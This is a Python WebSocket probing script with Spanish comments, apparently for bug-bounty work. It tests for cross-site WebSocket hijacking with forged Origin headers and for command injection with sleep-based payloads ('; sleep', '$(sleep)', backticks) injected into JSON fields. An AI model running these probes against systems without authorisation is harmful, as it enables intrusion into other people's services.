#!/usr/bin/env python3
"""
ws_probe.py

Recon y probing de WebSockets para dos clases de bug: CSWH (Cross-Site
WebSocket Hijacking, validación de Origin en el handshake) y command
injection timing-based sobre mensajes JSON.

NO genera gadget chains de deserialización ni exploits de RCE "listos para
usar" — eso queda para ysoserial u otra herramienta externa establecida,
apuntado a un callback OOB propio, una vez que este script confirma que el
vector (binario aceptado, campo mergeado sin sanitizar) existe. Este script
se queda en la fase de detección/evidencia, que es la que podés reportar
con confianza sin exponerte a mandar un exploit real contra un target de
bug bounty antes de tener el alcance claro.

Requiere: websockets (pip install websockets)

Uso:
    # Chequeo de CSWH: ¿el server valida Origin en el handshake?
    python3 ws_probe.py cswh --url wss://target.com/ws --real-origin https://target.com

    # Fuzzing de timing sobre un mensaje baseline capturado (JSON)
    python3 ws_probe.py timing --url wss://target.com/ws --baseline msg.json \\
        --field command --cookie "session=abc123" --samples 5
"""

import argparse
import asyncio
import json
import statistics
import sys
import time
from pathlib import Path

import websockets
from websockets.exceptions import WebSocketException

COMMAND_INJECTION_PAYLOADS = [
    "; sleep {n}",
    "`sleep {n}`",
    "$(sleep {n})",
    "| sleep {n} #",
    "|| sleep {n} #",
    "& sleep {n} &",
]

PROTOTYPE_POLLUTION_PAYLOADS = [
    {"__proto__": {"polluted_by_mulderx": True}},
    {"constructor": {"prototype": {"polluted_by_mulderx": True}}},
]


async def check_cswh(url: str, real_origin: str, fake_origins: list[str], cookie: str | None):
    """
    Intenta el handshake con distintos valores de Origin y reporta si el
    server acepta la conexión en cada caso. Si acepta con un origin que NO
    es el legítimo, hay CSWH potencial — confirmar después leyendo el
    primer mensaje que llega para ver si trae datos de sesión.
    """
    origins_to_test = [real_origin] + fake_origins
    results = []

    for origin in origins_to_test:
        headers = {"Origin": origin}
        if cookie:
            headers["Cookie"] = cookie

        try:
            async with websockets.connect(url, additional_headers=headers, open_timeout=10) as ws:
                accepted = True
                first_message = None
                try:
                    first_message = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    pass
        except (WebSocketException, OSError) as e:
            accepted = False
            first_message = str(e)

        results.append({"origin": origin, "accepted": accepted, "first_message": first_message})
        marker = "⚠️  ACEPTADO" if accepted else "rechazado"
        print(f"[{marker}] Origin={origin}")
        if accepted and first_message:
            preview = str(first_message)[:200]
            print(f"          primer mensaje: {preview}")

    legit_ok = any(r["origin"] == real_origin and r["accepted"] for r in results)
    fake_ok = [r for r in results if r["origin"] != real_origin and r["accepted"]]

    print("\n--- Resumen CSWH ---")
    if legit_ok and fake_ok:
        print("⚠️  El server acepta el handshake con Origin no legítimo.")
        print("    Confirmar manualmente que el stream resultante trae datos")
        print("    reales de la sesión (cookie) antes de reportar.")
    elif legit_ok and not fake_ok:
        print("Origin validado correctamente en los casos probados. Sin CSWH por esta vía.")
    else:
        print("No se pudo confirmar ni descartar — revisar errores de conexión arriba.")

    return results


def build_timing_variants(baseline: dict, field: str, sleep_seconds: int) -> list[dict]:
    variants = []
    for template in COMMAND_INJECTION_PAYLOADS:
        payload = json.loads(json.dumps(baseline))  # deep copy
        if field not in payload:
            raise ValueError(f"El campo '{field}' no existe en el baseline. Campos disponibles: {list(payload.keys())}")
        original = payload[field]
        payload[field] = f"{original}{template.format(n=sleep_seconds)}"
        variants.append({"template": template, "payload": payload})
    return variants


async def send_and_time(url: str, message: dict, cookie: str | None, timeout: float) -> float | None:
    headers = {"Cookie": cookie} if cookie else {}
    start = time.monotonic()
    try:
        async with websockets.connect(url, additional_headers=headers, open_timeout=10) as ws:
            await ws.send(json.dumps(message))
            try:
                await asyncio.wait_for(ws.recv(), timeout=timeout)
            except asyncio.TimeoutError:
                pass  # igual medimos el tiempo transcurrido
    except (WebSocketException, OSError) as e:
        print(f"    [error] {e}", file=sys.stderr)
        return None
    return time.monotonic() - start


async def check_timing(url: str, baseline: dict, field: str, cookie: str | None, samples: int, sleep_seconds: int, threshold: float):
    # Baseline: timing normal, sin inyección, varias muestras
    print(f"[*] Midiendo baseline ({samples} muestras, sin payload)...")
    baseline_times = []
    for i in range(samples):
        t = await send_and_time(url, baseline, cookie, timeout=sleep_seconds + 5)
        if t is not None:
            baseline_times.append(t)
            print(f"    muestra {i+1}: {t:.2f}s")

    if not baseline_times:
        print("No se pudo establecer baseline (todos los requests fallaron). Abortando.")
        return

    baseline_avg = statistics.mean(baseline_times)
    baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
    print(f"    baseline: avg={baseline_avg:.2f}s stdev={baseline_stdev:.2f}s\n")

    variants = build_timing_variants(baseline, field, sleep_seconds)

    print(f"[*] Probando {len(variants)} payloads de command injection sobre el campo '{field}'...\n")
    flagged = []

    for v in variants:
        print(f"--- payload: {v['template'].format(n=sleep_seconds)} ---")
        times = []
        for i in range(samples):
            t = await send_and_time(url, v["payload"], cookie, timeout=sleep_seconds + 10)
            if t is not None:
                times.append(t)
                print(f"    muestra {i+1}: {t:.2f}s")
        if not times:
            print("    sin datos (todos los requests fallaron)\n")
            continue

        avg = statistics.mean(times)
        delta = avg - baseline_avg
        print(f"    avg={avg:.2f}s  delta_vs_baseline={delta:.2f}s")
        if delta >= threshold:
            print(f"    ⚠️  POSIBLE command injection — delta consistente >= {threshold}s\n")
            flagged.append({"template": v["template"], "avg": avg, "delta": delta, "samples": times})
        else:
            print()

    print("\n--- Resumen timing ---")
    if flagged:
        print("⚠️  Payloads con delta sospechoso (confirmar con OOB callback antes de reportar):")
        for f in flagged:
            print(f"   {f['template']}: delta={f['delta']:.2f}s muestras={f['samples']}")
    else:
        print("Ningún payload mostró delta consistente por encima del threshold.")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="mode", required=True)

    p_cswh = sub.add_parser("cswh", help="Probar validación de Origin en el handshake")
    p_cswh.add_argument("--url", required=True, help="URL wss:// del endpoint")
    p_cswh.add_argument("--real-origin", required=True, help="Origin legítimo del sitio")
    p_cswh.add_argument("--fake-origin", action="append", default=["https://evil.example.com", "null"],
                         help="Origin(s) a probar como ilegítimos (repetible)")
    p_cswh.add_argument("--cookie", default=None, help="Cookie de sesión a usar en el handshake")

    p_timing = sub.add_parser("timing", help="Fuzzing de timing para command injection")
    p_timing.add_argument("--url", required=True, help="URL wss:// del endpoint")
    p_timing.add_argument("--baseline", required=True, help="Archivo JSON con el mensaje legítimo capturado")
    p_timing.add_argument("--field", required=True, help="Campo del JSON a fuzzear")
    p_timing.add_argument("--cookie", default=None, help="Cookie de sesión")
    p_timing.add_argument("--samples", type=int, default=5, help="Muestras por payload (default 5)")
    p_timing.add_argument("--sleep", type=int, default=5, dest="sleep_seconds", help="Segundos de sleep a inyectar (default 5)")
    p_timing.add_argument("--threshold", type=float, default=3.0, help="Delta mínimo en segundos para flaggear (default 3.0)")

    args = ap.parse_args()

    if args.mode == "cswh":
        asyncio.run(check_cswh(args.url, args.real_origin, args.fake_origin, args.cookie))
    elif args.mode == "timing":
        baseline = json.loads(Path(args.baseline).read_text())
        asyncio.run(check_timing(args.url, baseline, args.field, args.cookie, args.samples, args.sleep_seconds, args.threshold))


if __name__ == "__main__":
    main()
